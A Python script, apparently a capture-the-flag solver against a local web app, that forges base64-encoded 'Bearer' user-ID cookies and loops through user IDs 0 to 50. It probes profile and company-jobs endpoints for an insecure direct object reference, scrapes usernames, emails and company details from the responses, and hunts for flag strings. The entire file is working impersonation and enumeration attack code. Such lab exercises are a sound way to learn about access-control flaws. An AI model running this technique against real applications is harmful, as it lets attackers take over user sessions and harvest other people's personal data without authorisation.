import requests
import base64
import re

base_url = "http://127.0.0.1:32773"

def test_endpoint_with_user(endpoint, user_id):
    """Test specific endpoint with user ID cookie"""
    encoded = base64.b64encode(str(user_id).encode()).decode()
    cookie_value = f'"Bearer {encoded}"'
    headers = {"Cookie": f"access_token={cookie_value}"}
    
    try:
        response = requests.get(
            base_url + endpoint,
            headers=headers,
            timeout=10
        )
        return response.text, response.status_code, len(response.content)
    except Exception as e:
        return str(e), 0, 0

print("="*80)
print("TESTING DISCOVERED ENDPOINTS FOR IDOR")
print("="*80)
print(f"Base URL: {base_url}")
print(f"Endpoints: /company//jobs, /edit_profile/")
print("="*80)

# Test user IDs from 0-20
for user_id in range(0, 21):
    print(f"\n[Testing User ID: {user_id}]")
    
    # Test /company//jobs
    resp_jobs, status_jobs, size_jobs = test_endpoint_with_user("/company//jobs", user_id)
    print(f"  /company//jobs: Status {status_jobs} | Size {size_jobs}B", end="")
    
    if status_jobs == 200 and size_jobs > 100:
        # Extract company info
        companies = re.findall(r'Company:\s*([^<\n]+)', resp_jobs, re.I)
        if companies:
            print(f" | Companies: {[c.strip() for c in companies]}")
        else:
            print()
        
        # Check for flag
        flags = re.findall(r'FLAG\{[^}]+\}', resp_jobs)
        if flags:
            print(f"  [!] FLAG: {flags[0]}")
    else:
        print()
    
    # Test /edit_profile/
    resp_profile, status_profile, size_profile = test_endpoint_with_user("/edit_profile/", user_id)
    print(f"  /edit_profile/: Status {status_profile} | Size {size_profile}B", end="")
    
    if status_profile == 200 and size_profile > 100:
        # Extract user info
        usernames = re.findall(r'Username:\s*([^<\n]+)', resp_profile, re.I)
        emails = re.findall(r'Email:\s*([^<\n]+)', resp_profile, re.I)
        
        if usernames:
            print(f" | Usernames: {[u.strip() for u in usernames]}")
        elif emails:
            print(f" | Emails: {[e.strip() for e in emails]}")
        else:
            print()
        
        # Check for flag
        flags = re.findall(r'FLAG\{[^}]+\}', resp_profile)
        if flags:
            print(f"  [!] FLAG: {flags[0]}")
    elif status_profile == 404:
        # Try /edit_profile without trailing slash
        resp_profile2, status_profile2, size_profile2 = test_endpoint_with_user("/edit_profile", user_id)
        if status_profile2 == 200:
            print(f" | /edit_profile (no slash): {size_profile2}B")
        else:
            print()
    else:
        print()

# Test variations with numeric IDs appended
print("\n" + "="*80)
print("TESTING ID-BASED ENDPOINT VARIATIONS")
print("="*80)

# Try different ID parameter formats
id_formats = [
    "/edit_profile/1",
    "/edit_profile/2",
    "/edit_profile/0",
    "/company/1/jobs",
    "/company/2/jobs",
    "/company/0/jobs",
    "/profile/1",
    "/profile/2",
    "/user/1",
    "/user/2"
]

flags_found = []

for endpoint in id_formats:
    print(f"\n[Testing: {endpoint}]")
    
    # Test with different user cookies
    for user_id in [1, 2, 0]:
        resp, status, size = test_endpoint_with_user(endpoint, user_id)
        
        print(f"  Cookie as User {user_id}: Status {status} | Size {size}B", end="")
        
        if status == 200 and size > 100:
            # Look for sensitive data
            user_data = re.findall(r'User[^:]*:\s*([^<\n\r]+)', resp, re.I)
            company_data = re.findall(r'Company[^:]*:\s*([^<\n\r]+)', resp, re.I)
            
            if user_data:
                print(f" | User data found")
            if company_data:
                print(f" | Company: {[c.strip() for c in company_data][:2]}")
            
            # Check for flag
            flags = re.findall(r'FLAG\{[^}]+\}', resp)
            if flags:
                print(f"\n  [!] FLAG: {flags[0]}")
                flags_found.append((endpoint, user_id, flags[0]))
                # Get more context
                pos = resp.find(flags[0])
                context = resp[max(0, pos-100):min(len(resp), pos+len(flags[0])+100)]
                print(f"  Context: {context}\n")
            else:
                print()
        else:
            print()

print("\n" + "="*80)
print("SYSTEMATIC FLAG SEARCH ON DISCOVERED ENDPOINTS")
print("="*80)

# Test all user IDs on the most promising endpoints
test_endpoints = ["/edit_profile/", "/company//jobs"]

for endpoint in test_endpoints:
    print(f"\n[ENDPOINT: {endpoint}]")
    found_on_endpoint = []
    
    for user_id in range(0, 51):
        resp, status, size = test_endpoint_with_user(endpoint, user_id)
        
        if status == 200 and size > 100:
            flags = re.findall(r'FLAG\{[^}]+\}', resp)
            if flags:
                found_on_endpoint.append((user_id, flags[0]))
                print(f"  [FOUND] User {user_id}: {flags[0]}")
    
    if found_on_endpoint:
        flags_found.extend([(endpoint, uid, flag) for uid, flag in found_on_endpoint])
    else:
        print(f"  No flags found on this endpoint")

print("\n" + "!"*80)
print("FINAL RESULTS")
print("!"*80)

if flags_found:
    print(f"[SUCCESS] Found {len(flags_found)} flag(s):")
    for endpoint, user_id, flag in flags_found:
        print(f"\n  Endpoint: {endpoint}")
        print(f"  User ID: {user_id}")
        print(f"  Flag: {flag}")
        print("  " + "-"*60)
else:
    print("[PARTIAL SUCCESS] IDOR vulnerability confirmed")
    print("Cookie manipulation works but no flags found in:")
    print("  - /company//jobs")
    print("  - /edit_profile/")
    print(f"\nIDs tested: 0-50")
    print("Recommendation: Check other user-specific endpoints")
